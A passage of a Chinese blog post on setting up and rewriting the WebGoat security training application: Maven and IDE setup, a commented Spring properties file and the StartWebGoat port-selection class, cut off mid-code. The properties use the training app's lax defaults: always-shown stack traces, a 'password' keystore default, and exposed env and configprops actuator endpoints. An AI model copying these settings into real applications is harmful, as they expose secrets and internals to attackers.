<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>webgoat靶场审计 | wanan</title><meta name="keywords" content="java,代码审计,webgoat靶场审计"><meta name="author" content="wanan"><meta name="copyright" content="wanan"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="安装webgoat下载源码 https:&#x2F;&#x2F;github.com&#x2F;WebGoat&#x2F;WebGoat.git  下载mvn  环境变量  mvn -v   idea打开  jdk设置为17  改一下构建工具  下载依赖  我也是莫名其妙下完的,刚学这个不太懂 找到这个目录点这个箭头,如果下载完成了的话构建就会正常的    这样做主要是因为spring boot没学过,不会配置 MyWebGoat 这里">
<meta property="og:type" content="article">
<meta property="og:title" content="webgoat靶场审计">
<meta property="og:url" content="https://www.wanan.red/77b05baa.html">
<meta property="og:site_name" content="wanan">
<meta property="og:description" content="安装webgoat下载源码 https:&#x2F;&#x2F;github.com&#x2F;WebGoat&#x2F;WebGoat.git  下载mvn  环境变量  mvn -v   idea打开  jdk设置为17  改一下构建工具  下载依赖  我也是莫名其妙下完的,刚学这个不太懂 找到这个目录点这个箭头,如果下载完成了的话构建就会正常的    这样做主要是因为spring boot没学过,不会配置 MyWebGoat 这里">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://cdn.pixabay.com/photo/2018/08/23/07/35/thunderstorm-3625405_1280.jpg">
<meta property="article:published_time" content="2023-01-22T12:32:59.716Z">
<meta property="article:modified_time" content="2023-01-22T12:57:52.581Z">
<meta property="article:author" content="wanan">
<meta property="article:tag" content="java">
<meta property="article:tag" content="代码审计">
<meta property="article:tag" content="webgoat靶场审计">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://cdn.pixabay.com/photo/2018/08/23/07/35/thunderstorm-3625405_1280.jpg"><link rel="shortcut icon" href="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202203092159138.jpeg"><link rel="canonical" href="https://www.wanan.red/77b05baa"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//www.google-analytics.com" crossorigin=""/><link rel="preconnect" href="//hm.baidu.com"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta name="google-site-verification" content="Lkrie_55AalLqll4AtBs-NEomlv8QQYHGMx1V0cbq88"/><meta name="baidu-site-verification" content="code-h7qMMwh8fd"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "https://hm.baidu.com/hm.js?0a85e115f35e16b8da9503b0d77633ca";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();
</script><script async="async" src="https://www.googletagmanager.com/gtag/js?id=G-FYB0HL88QE"></script><script>window.dataLayer = window.dataLayer || [];
function gtag(){dataLayer.push(arguments);}
gtag('js', new Date());
gtag('config', 'G-FYB0HL88QE');
</script><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":false,"languages":{"hits_empty":"找不到您查询的内容：${query}"}},
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '天',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: true
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'webgoat靶场审计',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2023-01-22 20:57:52'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><meta name="generator" content="Hexo 6.0.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202203092159138.jpeg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">126</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">96</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">112</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://cdn.pixabay.com/photo/2018/08/23/07/35/thunderstorm-3625405_1280.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">wanan</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">webgoat靶场审计</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-01-22T12:32:59.716Z" title="发表于 2023-01-22 20:32:59">2023-01-22</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-01-22T12:57:52.581Z" title="更新于 2023-01-22 20:57:52">2023-01-22</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/java/">java</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/java/webgoat%E9%9D%B6%E5%9C%BA%E5%AE%A1%E8%AE%A1/">webgoat靶场审计</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">68.6k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>368分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="webgoat靶场审计"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="安装webgoat"><a href="#安装webgoat" class="headerlink" title="安装webgoat"></a>安装webgoat</h1><p>下载源码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://github.com/WebGoat/WebGoat.git</span><br></pre></td></tr></table></figure>

<p>下载mvn</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220524163535138.png" alt="image-20220524163535138"></p>
<p>环境变量</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220524163613082.png" alt="image-20220524163613082"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mvn -v</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220524163638372.png" alt="image-20220524163638372"></p>
<p>idea打开</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220524192934466.png" alt="image-20220524192934466"></p>
<p>jdk设置为17</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220524192952447.png" alt="image-20220524192952447"></p>
<p>改一下构建工具</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220524193029108.png" alt="image-20220524193029108"></p>
<p>下载依赖</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220524193046703.png" alt="image-20220524193046703"></p>
<p>我也是莫名其妙下完的,刚学这个不太懂</p>
<p>找到这个目录点这个箭头,如果下载完成了的话构建就会正常的</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220524193157199.png" alt="image-20220524193157199"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220524193241713.png" alt="image-20220524193241713"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220524193247826.png" alt="image-20220524193247826"></p>
<p>这样做主要是因为spring boot没学过,不会配置</p>
<h1 id="MyWebGoat"><a href="#MyWebGoat" class="headerlink" title="MyWebGoat"></a>MyWebGoat</h1><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220702155125505.png" alt="image-20220702155125505"></p>
<p>这里先了解了一些pom.xml的语法规则</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220702132857005.png" alt="image-20220702132857005"></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_41570658/article/details/120646393">https://blog.csdn.net/qq_41570658/article/details/120646393</a></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220702145820274.png" alt="image-20220702145820274"></p>
<p>propertiesw文件</p>
<figure class="highlight properties"><table><tr><td class="code"><pre><span class="line"><span class="attr">server.error.include-stacktrace</span>=<span class="string">always</span></span><br><span class="line"><span class="comment">#显示异常堆栈信息</span></span><br><span class="line"><span class="attr">server.error.path</span>=<span class="string">/error.html</span></span><br><span class="line"><span class="comment">#writelabel的默认路径是error.可以通过设置server.error.path参数自定义错误页面</span></span><br><span class="line"></span><br><span class="line"><span class="attr">server.servlet.context-path</span>=<span class="string">/WebGoat</span></span><br><span class="line"><span class="comment">#设置应用的上下文路径,项目的路径作为url地址的一部分</span></span><br><span class="line"><span class="attr">server.servlet.session.persistent</span>=<span class="string">false</span></span><br><span class="line"><span class="comment">#server.servlet.session.persistent默认值为false，但会持久化，需要在配置文件中重新配置为false，才会不持久化。</span></span><br><span class="line"></span><br><span class="line"><span class="attr">server.port</span>=<span class="string">$&#123;webgoat.port:8080&#125;</span></span><br><span class="line"><span class="comment">#服务器端口 这里就相当于如果webgoat.port有配置就使用webgoat.prot 如果没有配置就使用8080</span></span><br><span class="line"><span class="attr">server.address</span>=<span class="string">$&#123;webgoat.host&#125;</span></span><br><span class="line"><span class="comment">#服务器ip</span></span><br><span class="line"></span><br><span class="line"><span class="attr">webgoat.host</span>=<span class="string">$&#123;WEBGOAT_HOST:127.0.0.1&#125;</span></span><br><span class="line"><span class="comment">#服务器ip</span></span><br><span class="line"><span class="attr">spring.application.name</span>=<span class="string">WebGoat</span></span><br><span class="line"><span class="comment">#是用来代表服务名的</span></span><br><span class="line"></span><br><span class="line"><span class="attr">server.ssl.key-store-type</span>=<span class="string">$&#123;WEBGOAT_KEYSTORE_TYPE:PKCS12&#125;</span></span><br><span class="line"><span class="comment">#ssl证书的类型PKCS12</span></span><br><span class="line"><span class="attr">server.ssl.key-store</span>=<span class="string">$&#123;WEBGOAT_KEYSTORE:classpath:goatkeystore.pkcs12&#125;</span></span><br><span class="line"><span class="comment">#ssl证书的路径</span></span><br><span class="line"><span class="attr">server.ssl.key-store-password</span>=<span class="string">$&#123;WEBGOAT_KEYSTORE_PASSWORD:password&#125;</span></span><br><span class="line"><span class="comment">#ssl保存证书密钥库的密码</span></span><br><span class="line"><span class="attr">server.ssl.key-alias</span>=<span class="string">$&#123;WEBGOAT_KEY_ALIAS:goat&#125;</span></span><br><span class="line"><span class="comment">#ssl标识密钥库中密钥的别名</span></span><br><span class="line"><span class="attr">server.ssl.enabled</span>=<span class="string">$&#123;WEBGOAT_SSLENABLED:false&#125;</span></span><br><span class="line"><span class="comment">#是否启用ssl支持</span></span><br><span class="line"></span><br><span class="line"><span class="attr">spring.datasource.url</span>=<span class="string">jdbc:hsqldb:file:$&#123;webgoat.server.directory&#125;/webgoat</span></span><br><span class="line"><span class="comment">#连接数据库的路径</span></span><br><span class="line"><span class="attr">spring.jpa.properties.hibernate.dialect</span>=<span class="string">org.hibernate.dialect.HSQLDialect</span></span><br><span class="line"><span class="comment">#使用的jpa语言是什么</span></span><br><span class="line"><span class="attr">spring.datasource.driver-class-name</span>=<span class="string">org.hsqldb.jdbc.JDBCDriver</span></span><br><span class="line"><span class="comment">#使用的驱动名称</span></span><br><span class="line"><span class="attr">spring.jpa.properties.hibernate.default_schema</span>=<span class="string">CONTAINER</span></span><br><span class="line"><span class="attr">spring.banner.location</span>=<span class="string">classpath:banner.txt</span></span><br><span class="line"><span class="comment">#这个是启动时的文字图片</span></span><br><span class="line"></span><br><span class="line"><span class="attr">logging.level.org.thymeleaf</span>=<span class="string">INFO</span></span><br><span class="line"><span class="comment">#thymeleaf 支持 trace、debug、info级别的日志信息</span></span><br><span class="line"><span class="attr">logging.level.org.thymeleaf.TemplateEngine.CONFIG</span>=<span class="string">INFO</span></span><br><span class="line"><span class="comment">#初始化期间输出详细配置信息</span></span><br><span class="line"><span class="attr">logging.level.org.thymeleaf.TemplateEngine.TIMER</span>=<span class="string">INFO</span></span><br><span class="line"><span class="comment">#输出模板引擎执行时间</span></span><br><span class="line"><span class="attr">logging.level.org.thymeleaf.TemplateEngine.cache.TEMPLATE_CACHE</span>=<span class="string">INFO</span></span><br><span class="line"><span class="comment">#输出模板表达式缓存信息</span></span><br><span class="line"><span class="attr">logging.level.org.springframework.web</span>=<span class="string">INFO</span></span><br><span class="line"><span class="comment">#org.springframework.web包下的日志以info级别输出</span></span><br><span class="line"><span class="attr">logging.level.org.springframework</span>=<span class="string">INFO</span></span><br><span class="line"><span class="attr">logging.level.org.springframework.boot.devtools</span>=<span class="string">INFO</span></span><br><span class="line"><span class="attr">logging.level.org.owasp</span>=<span class="string">DEBUG</span></span><br><span class="line"><span class="attr">logging.level.org.owasp.webgoat</span>=<span class="string">DEBUG</span></span><br><span class="line"></span><br><span class="line"><span class="attr">webgoat.server.directory</span>=<span class="string">$&#123;user.home&#125;/.webgoat-$&#123;webgoat.build.version&#125;/</span></span><br><span class="line"><span class="comment">#webgoat.server.directory的目录</span></span><br><span class="line"><span class="attr">webgoat.user.directory</span>=<span class="string">$&#123;user.home&#125;/.webgoat-$&#123;webgoat.build.version&#125;/</span></span><br><span class="line"><span class="comment">#webgoat.user.directory的目录</span></span><br><span class="line"><span class="attr">webgoat.build.version</span>=<span class="string">@project.version@</span></span><br><span class="line"><span class="comment">#这里也就是从pom.xml中取出版本</span></span><br><span class="line"><span class="attr">webgoat.email</span>=<span class="string">webgoat@owasp.org</span></span><br><span class="line"><span class="attr">webgoat.emaillist</span>=<span class="string">owasp-webgoat@lists.owasp.org</span></span><br><span class="line"><span class="attr">webgoat.feedback.address</span>=<span class="string">webgoat@owasp.org</span></span><br><span class="line"><span class="attr">webgoat.feedback.address.html</span>=<span class="string">&lt;A HREF=mailto:webgoat@owasp.org&gt;webgoat@owasp.org&lt;/A&gt;</span></span><br><span class="line"><span class="attr">webgoat.database.connection.string</span>=<span class="string">jdbc:hsqldb:mem:&#123;USER&#125;</span></span><br><span class="line"><span class="attr">webgoat.default.language</span>=<span class="string">en</span></span><br><span class="line"></span><br><span class="line"><span class="attr">webwolf.host</span>=<span class="string">$&#123;WEBWOLF_HOST:127.0.0.1&#125;</span></span><br><span class="line"><span class="comment">#webwolf的ip</span></span><br><span class="line"><span class="attr">webwolf.port</span>=<span class="string">$&#123;WEBWOLF_PORT:9090&#125;</span></span><br><span class="line"><span class="comment">#webwolf的端口</span></span><br><span class="line"><span class="attr">webwolf.url</span>=<span class="string">http://$&#123;webwolf.host&#125;:$&#123;webwolf.port&#125;</span></span><br><span class="line"><span class="comment">#webwolf的url</span></span><br><span class="line"><span class="attr">webwolf.landingpage.url</span>=<span class="string">$&#123;webwolf.url&#125;/landing</span></span><br><span class="line"></span><br><span class="line"><span class="attr">webwolf.mail.url</span>=<span class="string">$&#123;webwolf.url&#125;/mail</span></span><br><span class="line"></span><br><span class="line"><span class="attr">spring.jackson.serialization.indent_output</span>=<span class="string">true</span></span><br><span class="line"><span class="comment">#忽略无法转换的对象</span></span><br><span class="line"><span class="attr">spring.jackson.serialization.write-dates-as-timestamps</span>=<span class="string">false</span></span><br><span class="line"><span class="comment">#将date转换为时间戳</span></span><br><span class="line"><span class="comment">#For static file refresh ... and faster dev :D</span></span><br><span class="line"><span class="attr">spring.devtools.restart.additional-paths</span>=<span class="string">webgoat-container/src/main/resources/static/js,webgoat-container/src/main/resources/static/css</span></span><br><span class="line"><span class="comment">#添加的路径</span></span><br><span class="line"><span class="attr">exclude.categories</span>=<span class="string">$&#123;EXCLUDE_CATEGORIES:none,none&#125;</span></span><br><span class="line"><span class="comment">#exclude based on the enum of the Category</span></span><br><span class="line"></span><br><span class="line"><span class="attr">exclude.lessons</span>=<span class="string">$&#123;EXCLUDE_LESSONS:none,none&#125;</span></span><br><span class="line"><span class="comment">#exclude based on the class name of a lesson e.g.: LessonTemplate</span></span><br><span class="line"></span><br><span class="line"><span class="attr">management.health.db.enabled</span>=<span class="string">true</span></span><br><span class="line"><span class="comment">#启用开发者配置内容的健康指标</span></span><br><span class="line"><span class="attr">management.endpoint.health.show-details</span>=<span class="string">always</span></span><br><span class="line"><span class="comment">#health端点公开的信息可以配置 详细信息显示给所有用户</span></span><br><span class="line"><span class="attr">management.endpoints.web.exposure.include</span>=<span class="string">env, health,configprops</span></span><br><span class="line"><span class="comment">#暴露需要监控的接口</span></span><br></pre></td></tr></table></figure>

<h1 id="Server"><a href="#Server" class="headerlink" title="Server"></a>Server</h1><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220702153801895.png" alt="image-20220702153801895"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220702153838830.png" alt="image-20220702153838830"></p>
<p>会发现添加了一个依赖项目</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220702153910207.png" alt="image-20220702153910207"></p>
<p>源码下载</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mvn dependency:resolve -Dclassifier=sources</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220702160618821.png" alt="image-20220702160618821"></p>
<h2 id="server-StartWebGoat"><a href="#server-StartWebGoat" class="headerlink" title="server.StartWebGoat"></a>server.StartWebGoat</h2><p>从这里开始并不是直接写完这个一个startwebGoat文件的,而是从这里遇到新的就去写.</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.server;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.WebGoat;</span><br><span class="line"><span class="keyword">import</span> lombok.extern.slf4j.Slf4j;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.Banner;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.WebApplicationType;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.builder.SpringApplicationBuilder;</span><br><span class="line"><span class="keyword">import</span> org.springframework.util.SocketUtils;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> java.util.Optional.of;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> java.util.Optional.ofNullable;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Slf4j</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">StartWebGoat</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">WEBGOAT_PORT</span> <span class="operator">=</span> <span class="string">&quot;webgoat.port&quot;</span>;</span><br><span class="line">    <span class="comment">//    定义webgoat的字符</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">MAX_PORT</span> <span class="operator">=</span> <span class="number">9999</span>;</span><br><span class="line">    <span class="comment">//    定义最大端口</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        setEnvironmentVariableForPort(WEBGOAT_PORT,<span class="string">&quot;8080&quot;</span>);</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">SpringApplicationBuilder</span>().parent(ParentConfig.class)<span class="comment">//使用Parentconfig配置类</span></span><br><span class="line">                .web(WebApplicationType.NONE).bannerMode(Banner.Mode.OFF)<span class="comment">//不启动内嵌的WebServer，不是运行web application   banner也就是启动的那个图</span></span><br><span class="line">                .child(WebGoat.class)<span class="comment">//定义子配置项</span></span><br><span class="line">                .web(WebApplicationType.SERVLET)<span class="comment">//启动内嵌的reactive web server，这个application是一个reactive web application</span></span><br><span class="line">                .run(args);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 用于设置环境端口</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> name 自定义端口号</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> defaultValue 默认端口号</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setEnvironmentVariableForPort</span><span class="params">(String name,String defaultValue)</span>&#123;</span><br><span class="line">        ofNullable(System.getProperty(name))<span class="comment">//       如果 value 非 null ，则创建一个包含了指定 T 类型的 value 值的 Optional 实例，否则创建一个空的 Optional 实例</span></span><br><span class="line"></span><br><span class="line">                .or(()-&gt;of(defaultValue)) <span class="comment">//or 就是如果指定了端口就返回指定端口 如果没有指定端口就用默认端口</span></span><br><span class="line">                .map(Integer::parseInt) <span class="comment">//如果给定端口就进行类型转换</span></span><br><span class="line">                .map(port -&gt; findPort(port)) <span class="comment">//同样如果给定端口就去寻找是否有可用端口</span></span><br><span class="line">                .ifPresent(port -&gt; System.setProperty(name,port));<span class="comment">//如果找到了就将端口定下来</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">findPort</span><span class="params">(<span class="type">int</span> port)</span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span>(port == MAX_PORT)&#123;</span><br><span class="line"><span class="comment">//            如果端口到达最大端口就打印日志并返回端口信息</span></span><br><span class="line">                log.error(<span class="string">&quot;No free port found from 8080 - &#123;&#125;&quot;</span>,MAX_PORT);</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;&quot;</span>+ port;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;&quot;</span> + SocketUtils.findAvailableTcpPort(port,port);</span><br><span class="line"><span class="comment">//        从端口范围中随机选择一个可用端口</span></span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalStateException var4)&#123;</span><br><span class="line">            <span class="keyword">return</span> findPort(port +<span class="number">1</span>);</span><br><span class="line"><span class="comment">//                    如果没有端口不可用就端口加一再次寻找端口</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="container"><a href="#container" class="headerlink" title="container"></a>container</h1><h2 id="WebGoat"><a href="#WebGoat" class="headerlink" title="WebGoat"></a>WebGoat</h2><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220702200431223.png" alt="image-20220702200431223"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220702200359178.png" alt="image-20220702200359178"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.container;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.session.UserSessionData;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.session.WebSession;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Value;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.autoconfigure.EnableAutoConfiguration;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.*;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.client.RestTemplate;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="meta">@ComponentScan(basePackages = &#123;&quot;com.wanan.webgoat.container&quot;,&quot;com.wanan.webgoat.lessons&quot;&#125;)</span></span><br><span class="line"><span class="comment">//根据定义的扫描路径，把符合扫描规则的类装配到spring容器中</span></span><br><span class="line"><span class="meta">@PropertySource(&quot;classpath:application-webgoat.properties&quot;)</span></span><br><span class="line"><span class="comment">//properties类型配置文件</span></span><br><span class="line"><span class="meta">@EnableAutoConfiguration</span></span><br><span class="line"><span class="comment">//@EnableAutoConfiguration注释，此注释自动载入应用程序所需的所有Bean</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">WebGoat</span> &#123;</span><br><span class="line">    <span class="meta">@Bean(name = &quot;pluginTargetDirectory&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> File <span class="title function_">pluginTargetDirectory</span><span class="params">(<span class="meta">@Value(&quot;$&#123;webgoat.user.directory&#125;&quot;)</span> <span class="keyword">final</span> String webgoatHome)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">File</span>(webgoatHome);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//    